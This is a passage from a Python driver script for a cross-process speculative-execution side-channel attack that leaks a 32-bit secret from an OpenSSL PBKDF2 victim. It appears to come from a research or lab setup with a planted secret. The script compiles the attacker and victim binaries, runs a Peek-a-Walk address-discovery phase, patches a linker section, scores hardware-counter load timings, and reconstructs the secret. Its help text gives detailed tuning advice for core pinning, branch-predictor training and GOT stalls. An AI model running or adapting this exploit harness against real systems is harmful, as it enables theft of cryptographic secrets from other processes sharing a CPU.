        t_out = threading.Thread(target=drain, args=(proc.stdout, stdout_lines, "", log))
        t_err = threading.Thread(target=drain, args=(proc.stderr, stderr_lines, "[STDERR] ", log))
        t_out.start()
        t_err.start()
        proc.wait()
        t_out.join()
        t_err.join()

    return "".join(stdout_lines), "".join(stderr_lines)


def parse_load_timings(stdout):
    """
    Parses Load Timings (column index 1) only from data rows that appear
    after the 'Custom PMCounter results:' line in the output.
    """
    values = []
    in_custom_section = False
    for line in stdout.splitlines():
        if "Custom PMCounter results" in line:
            in_custom_section = True
            continue
        if not in_custom_section:
            continue
        line = line.strip()
        if not line or line.startswith("@@") or line.startswith("@"):
            continue
        parts = line.split()
        if len(parts) >= 1:
            try:
                values.append(float(parts[0]))
            except ValueError:
                pass
    return values


def parse_decoded_address(stderr):
    """Parses 'The bits decoded are <hex>' from stderr."""
    m = re.search(r"The bits decoded are ([0-9a-fA-F]+)", stderr)
    if m:
        return int(m.group(1), 16)
    return None


def hit_stats(vals):
    """Summarises a list of per-round load timings as (hits, total, rate)."""
    hits = sum(1 for v in vals if v < HIT_CYCLES)
    total = len(vals)
    return hits, total, (hits / total if total else 0.0)


def signal_present(vals):
    """Decides whether a set of load timings shows the speculative fetch.

    The attacker reports one value PER ROUND. Only a minority of rounds catch a
    victim write -- the victim reaches the gadget on its own schedule and the
    attacker samples it blind -- so the question is what fraction come back
    fast, not whether any single number is low. The measured no-signal floor is
    about 0.2%, against a MIN_HIT_RATE of 2%.
    """
    if not vals:
        print("[WARN] No Memory Load values parsed")
        return False

    hits, total, rate = hit_stats(vals)
    ok = rate >= MIN_HIT_RATE
    print(f"[INFO] hits (< {HIT_CYCLES} cycles): {hits}/{total} = {rate:.3%} "
          f"(need >= {MIN_HIT_RATE:.1%}) -> {'SIGNAL' if ok else 'no signal'}")
    if total:
        ordered = sorted(vals)
        print(f"[INFO] min {ordered[0]:.0f}  p05 {ordered[total//20]:.0f}  "
              f"median {ordered[total//2]:.0f}  max {ordered[-1]:.0f}")
    return ok


def check_collision_0(num_runs=3):
    """Runs collision=0 num_runs times and pools the results."""
    clock_results = []
    for i in range(num_runs):
        print(f"[INFO] collision=0 run {i+1}/{num_runs}")
        stdout, stderr = run_binary()
        print(f"[STDOUT]\n{stdout}")
        vals = parse_load_timings(stdout)
        if not vals:
            print("[WARN] No Memory Load values parsed")
            return False
        hits, total, rate = hit_stats(vals)
        print(f"[INFO] run {i+1}: {hits}/{total} hits ({rate:.3%})")
        clock_results.extend(vals)

    print(f"[INFO] Pooled {len(clock_results)} load timing values "
          f"across {num_runs} runs")
    return signal_present(clock_results)


def main():
    # Declared up front: the argparse defaults below read these module globals,
    # and Python requires the declaration to precede any use in the scope.
    global SLEEP_NS, TRAIN_COUNT, NUM_ROUNDS
    global HIT_CYCLES, MIN_HIT_RATE
    global PWSC_TRIALS, PWSC_THRESHOLD, CORE_ID
    global PWSC_ATTEMPTS_L1, PWSC_ATTEMPTS_L2
    global USE_SPINLOCKS, GOT_STALL, PBKDF2_ITERS, VICTIM_CALLS

    parser = argparse.ArgumentParser(
        description="Leak a secret from an OpenSSL victim across processes"
    )
    parser.add_argument(
        "--addr", type=lambda x: int(x, 0), default=None,
        help="Skip the Peek-a-Walk discovery step and use this address directly "
             "(e.g. 0x12340000)",
    )
    parser.add_argument(
        "--secret_value", type=lambda x: int(x, 0), default=0x12345678,
        help="The 32-bit secret placed in the victim's PBKDF2 password "
             "(e.g. 0x12345678)",
    )
    parser.add_argument(
        "--sleep_ns", type=int, default=SLEEP_NS,
        help=f"Nanoseconds the attacker blocks to give the "
             f"victim the core (default {SLEEP_NS}). Wants to be long enough to "
             f"span at least one victim gadget call; sweep it if the hit rate is "
             f"low.",
    )
    parser.add_argument(
        "--train_count", type=int, default=TRAIN_COUNT,
        help=f"start_collision calls per round (default {TRAIN_COUNT}). These "
             f"install E1 and are required, but also dominate round time and "
             f"overwrite E2, so lowering raises the sampling rate until E1 "
             f"training becomes too weak.",
    )
    parser.add_argument(
        "--num_rounds", type=int, default=NUM_ROUNDS,
        help=f"Measured rounds per attacker run (default {NUM_ROUNDS}).",
    )
    parser.add_argument(
        "--pwsc_trials", type=int, default=PWSC_TRIALS,
        help=f"Peek-a-Walk trials per profile_cache call (default "
             f"{PWSC_TRIALS}). Run time is linear in this. pwsc.h's calibrated "
             f"pairings are 128 trials/55 threshold and 16/4; change "
             f"--pwsc_threshold with it.",
    )
    parser.add_argument(
        "--pwsc_threshold", type=int, default=PWSC_THRESHOLD,
        help=f"Peek-a-Walk solver gap threshold (default {PWSC_THRESHOLD}). "
             f"Gates loop 1 only; spike.py decides PL1. The MEASURED gap grows "
             f"with --pwsc_trials but this threshold does not scale with it, so "
             f"re-derive from data if you change trials.",
    )
    parser.add_argument(
        "--core_id", type=int, default=CORE_ID,
        help=f"Logical core to pin BOTH processes to (default {CORE_ID}). "
             f"Prefer an isolcpus core whose SMT sibling is also isolated; the "
             f"sibling shares L1D and the page-structure caches with the "
             f"measurement.",
    )
    parser.add_argument(
        "--hit_cycles", type=int, default=HIT_CYCLES,
        help=f"A round under this many cycles counts as a hit "
             f"(default {HIT_CYCLES}).",
    )
    parser.add_argument(
        "--min_hit_rate", type=float, default=MIN_HIT_RATE,
        help=f"Hit fraction required to declare a signal "
             f"(default {MIN_HIT_RATE}). The measured no-signal floor is ~0.002.",
    )
    parser.add_argument(
        "--pwsc_attempts_l1", type=int, default=PWSC_ATTEMPTS_L1,
        help=f"Attempts per co in loop 1, the PL2 search (default "
             f"{PWSC_ATTEMPTS_L1}). Loop 1 breaks on the first accepting co, so "
             f"cost is 1-4 x this.",
    )
    parser.add_argument(
        "--pwsc_attempts_l2", type=int, default=PWSC_ATTEMPTS_L2,
        help=f"Attempts per co in loop 2, the PL1 search (default "
             f"{PWSC_ATTEMPTS_L2}). Loop 2 never short-circuits, so cost is "
             f"always 8 x this -- the dominant term in the whole run.",
    )
    parser.add_argument(
        "--use_spinlocks", type=int, default=USE_SPINLOCKS, choices=(0, 1),
        help="1 = strict shared-memory turn-taking handoff (no sleep); pair with "
             "--got_stall 3 so the victim opens its own window. 0 (default) = "
             "sleep-based handoff with attacker TLB-evict. Both binaries are "
             "built with this value.",
    )
    parser.add_argument(
        "--got_stall", type=int, default=GOT_STALL, choices=(0, 1, 2, 3),
        help="How the victim's strlen@GOT is made to stall (opens the spec. "
             "window). 0 (default) = none (attacker opens it via TLB-evict in the "
             "sleep handoff). 3 = victim clflushes its own GOT slot; required "
             "with --use_spinlocks 1.",
    )
    parser.add_argument(
        "--pbkdf2_iters", type=int, default=PBKDF2_ITERS,
        help="HMAC iteration count the victim requests (default 10000). These "
             "run AFTER strlen@plt, so lowering to 1 removes the churn they put "
             "on the E2 BTB entry before readback. Diagnostic only.",
    )
    parser.add_argument(
        "--victim_calls", type=int, default=VICTIM_CALLS,
        help="Gadget (strlen@plt) calls per victim turn (default 4). Set 1 for "
             "the minimal-churn test: one speculative BTB write, then hand back.",
    )
    parser.add_argument(
        "--verify_only", action="store_true",
        help="Build both binaries, check that the offsets baked into "
             "attacker.nasm still describe libcrypto, and align every fake "
             "function onto its victim counterpart -- then exit without "
             "attacking. Use this to confirm the toolchain and layout are "
             "sound before committing to a multi-hour run. Needs no MSR "
             "driver, no isolated core, and takes about a minute.",
    )
    args = parser.parse_args()

    SLEEP_NS = args.sleep_ns
    TRAIN_COUNT = args.train_count
    NUM_ROUNDS = args.num_rounds
    HIT_CYCLES = args.hit_cycles
    MIN_HIT_RATE = args.min_hit_rate
    PWSC_TRIALS = args.pwsc_trials
    PWSC_THRESHOLD = args.pwsc_threshold
    CORE_ID = args.core_id
    PWSC_ATTEMPTS_L1 = args.pwsc_attempts_l1
    PWSC_ATTEMPTS_L2 = args.pwsc_attempts_l2
    USE_SPINLOCKS = args.use_spinlocks
    GOT_STALL = args.got_stall
    PBKDF2_ITERS = args.pbkdf2_iters
    VICTIM_CALLS = args.victim_calls

    if args.addr is None:
        rows = PWSC_TRIALS * 64 * 10
        pairs = rows * 2          # noise phase and signal phase both block
        hours = pairs * (SLEEP_NS / 1e9) * 3 / 3600.0
        print(f"[WARN] No --addr: this runs the Peek-a-Walk discovery "
              f"phase, and every one of its setup/trigger pairs blocks "
              f"for a full victim gadget call. At the current settings one "
              f"find_level0_line call is ~{pairs * 3:,} handoffs, roughly "
              f"{hours:.1f} h, and a decode needs at least two of them. Cut "
              f"--pwsc_trials (with --pwsc_threshold) to make this "
              f"tractable.")

    print("=" * 60)
    print(f"The secret value to decode is: {hex(args.secret_value)}")
    print("=" * 60)

    print("=" * 60)
    print("Step 0: Compile the victim ONCE (fixed secret). It is never rebuilt after this.")
    print("=" * 60)
    compile_victim(args.secret_value)

    # Always, on every launch. Step 2 patches attacker.ld in place and never
    # restores it, so this is what keeps consecutive runs reproducible. Harmless
    # on the --addr path, which patches the section deliberately straight after.
    reset_malicious_target(args.secret_value)

    # The victim objdump has to exist before the chain check; the attacker is
    # built here too so the same dump pass covers both.
    compile_attacker(collision=1, secret_value=args.secret_value,
                     leak_final_6=0, num_align=0)
    _run_objdump()
    verify_victim_chain()

    if args.verify_only:
        # Everything above is layout: the toolchain, the chain offsets, and the
        # linker script. objdump_and_verify() is the part that actually patches
        # attacker.ld, so run it here too -- otherwise "verify" would pass on a
        # tree that a real run would still have to fix up.
        print("=" * 60)
        print("Verifying the attacker layout (--verify_only)")
        print("=" * 60)
        objdump_and_verify(collision=1, secret_value=args.secret_value,
                           leak_final_6=0, num_align=0)
        print("=" * 60)
        print("[OK]  Setup verified. Both binaries build, the chain offsets "
              "match libcrypto,")
        print("      and every fake function shadows its victim. Drop "
              "--verify_only to attack.")
        print("=" * 60)
        return

    if args.addr is not None:
        candidate_addr = args.addr
        print("=" * 60)
        print(f"Using provided address: {hex(candidate_addr)} "
              f"(skipping the Peek-a-Walk discovery step)")
        print("=" * 60)
    else:
        print("=" * 60)
        print("Step 1: Run get_higher_bits=1 to decode the candidate address")
        print("=" * 60)

        objdump_and_verify(collision=1, secret_value=args.secret_value,
                           leak_final_6=0, num_align=0)

        # A fresh directory per run: spike.py groups by call index across every
        # CSV it finds, so mixing two runs' dumps silently corrupts the layout.
        dumpdir = os.path.join(WORKDIR, "pwsc_raw",
                               f"{args.secret_value:08x}_{time.strftime('%Y%m%d_%H%M%S')}")
        if os.path.isdir(dumpdir):
            shutil.rmtree(dumpdir)
        os.makedirs(dumpdir)
        print(f"[INFO] raw dump -> {dumpdir}")

        stdout, stderr = run_binary(extra_env={
            "PWSC_RAW_DUMP": dumpdir,
            "PWSC_ATTEMPTS_L1": PWSC_ATTEMPTS_L1,
            "PWSC_ATTEMPTS_L2": PWSC_ATTEMPTS_L2,
            "PWSC_EVICT_PL1": PWSC_EVICT_PL1,
        })

        c_addr = parse_decoded_address(stderr)
        if c_addr is None:
            c_addr = parse_decoded_address(stdout)

        if c_addr is None:
            print("[ERROR] Could not parse decoded address from output. Exiting.")
            sys.exit(1)

        print(f"\n[INFO] leak.c decoded: {hex(c_addr)}")

        # Step 1b. leak.c's loop 2 only collects; the PL1 decision is made here,
        # from the raw dump. Its in-process rule ("first co whose best line
        # clears the gap threshold") accepts the co-INDEPENDENT self-noise
        # artifact, because that artifact clears the threshold at every co --
        # on run_45678213_v2 it took L0 at co=0 while the true answer, L15 at
        # co=3, sat unused in the same sweep. spike.py subtracts the loop-1
        # co=0 null control and then keeps only lines that fire at exactly one
        # co, which separated them by 77.9x on that run.
        print("=" * 60)
        print("Step 1b: Score the raw dump to fix the upper bits")
        print("=" * 60)
        try:
            result = spike.analyze(dumpdir,
                                   attempts_l1=PWSC_ATTEMPTS_L1,
                                   attempts_l2=PWSC_ATTEMPTS_L2)
        except (ValueError, FileNotFoundError) as e:
            # Do not discard a completed measurement over a scoring failure:
            # the dump is on disk and leak.c already produced a candidate.
            # Fall back to it and let step 2 adjudicate -- the linear search
            # either finds the address or it does not.
            print(f"[ERROR] spike could not score {dumpdir}: {e}")
            print(f"[WARN] falling back to leak.c's own decode "
                  f"({hex(c_addr & spike.UPPER_MASK)}), which takes the first "
                  f"accepting co and can pick the co-independent self-noise "
                  f"line. Score the dump by hand to confirm:")
            print(f"[WARN]   python3 spike.py {dumpdir} "
                  f"--attempts-l1 {PWSC_ATTEMPTS_L1} "
                  f"--attempts-l2 {PWSC_ATTEMPTS_L2}")
            result = None

        if result is not None and not result["fields"]:
            print("[ERROR] No line fired at exactly one co, so the PL1 level is "
                  "undetermined and the linear search has nothing to start "
                  "from. The dump is kept at "
                  f"{dumpdir} -- rerun spike.py on it with a lower "
                  "--uniq-frac to see how close it came.")
            sys.exit(1)

        if result is None:
            candidate_addr = c_addr & spike.UPPER_MASK
            fields = {}
        else:
            candidate_addr, fields = spike.combine(c_addr, result)

        print(f"\n[INFO] upper bits (15-32): {hex(candidate_addr)}")
        print("[INFO] " + "  ".join(f"{k}={v}" for k, v in fields.items()))
        if result is not None and not result["ok"]:
            print(f"[WARN] the PL1 winner cleared its runner-up by only "
                  f"{result['pl1']['margin']:.1f}x (want >= {spike.MIN_MARGIN}). "
                  f"Continuing, but a wrong PL1 line puts the true address "
                  f"outside the {MAX_INCREMENTS * ADDR_STEP} byte span the "
                  f"linear search covers, so step 2 would fail without ever "
                  f"saying why.")

        if result is not None and candidate_addr != (c_addr & spike.UPPER_MASK):
            print(f"[INFO] this differs from leak.c's own decode "
                  f"({hex(c_addr & spike.UPPER_MASK)}); spike's PL1 result wins "
                  f"-- see the comparison above.")

    print("=" * 60)
    print("Step 2: Patch attacker.ld and search for the correct address")
    print("=" * 60)

    base_addr = candidate_addr
    found_addr = None

    for increment in range(MAX_INCREMENTS + 1):
        current_addr = base_addr + increment * ADDR_STEP
        print(f"\n[INFO] Trying .sec_malicious_target = {hex(current_addr)} "
              f"(increment {increment})")

        set_malicious_target_addr(current_addr)
        compile_attacker(collision=0, secret_value=args.secret_value,
                         leak_final_6=0, num_align=0)
        objdump_and_verify(collision=0, secret_value=args.secret_value,
                           leak_final_6=0, num_align=0)

        if check_collision_0(num_runs=3):
            found_addr = current_addr
            print(f"\n[SUCCESS] Found good address: {hex(found_addr)}")
            break
        else:
            print(f"[INFO] Address {hex(current_addr)} did not pass load timing "
                  f"check, incrementing...")

    print("=" * 60)
    if found_addr is not None:
        print(f"Final .sec_malicious_target address: {hex(found_addr)}")
    else:
        print("[FAIL] Could not find a good address within 512 increments.")
        print("=" * 60)
        return
    print("=" * 60)

    print("=" * 60)
    print(f"Step 3: Recompile with leak_final_6=1 and sweep num_align from 0 to "
          f"{NUM_ALIGN_MAX}")
    print("=" * 60)

    found_align = None
    for na in range(NUM_ALIGN_MAX + 1):
        print("\n" + "-" * 60)
        print(f"[INFO] num_align = {na}  (.sec_malicious_target = {hex(found_addr)})")
        print("-" * 60)

        compile_attacker(collision=0, secret_value=args.secret_value,
                         leak_final_6=1, num_align=na)
        objdump_and_verify(collision=0, secret_value=args.secret_value,
                           leak_final_6=1, num_align=na)
        stdout, stderr = run_binary()
        print(f"[STDOUT]\n{stdout}")
        if stderr:
            print(f"[STDERR]\n{stderr}")

        vals = parse_load_timings(stdout)
        if signal_present(vals):
            found_align = na
            print(f"\n[SUCCESS] num_align = {na} shows the speculative fetch")
            break
        else:
            print(f"[INFO] num_align = {na} shows no signal, continuing...")

    print("=" * 60)
    print("Final result")
    print("=" * 60)
    print(f".sec_malicious_target = {hex(found_addr)}")
    if found_align is not None:
        print(f"num_align             = {found_align}")
        print(f"secret_value          = {hex(found_addr | found_align)}")
    else:
        print(f"num_align             = (none in 0..{NUM_ALIGN_MAX} dropped load "
              f"timings below 300000)")
    print("=" * 60)


if __name__ == "__main__":
    try:
        main()
    finally:
        kill_victim()
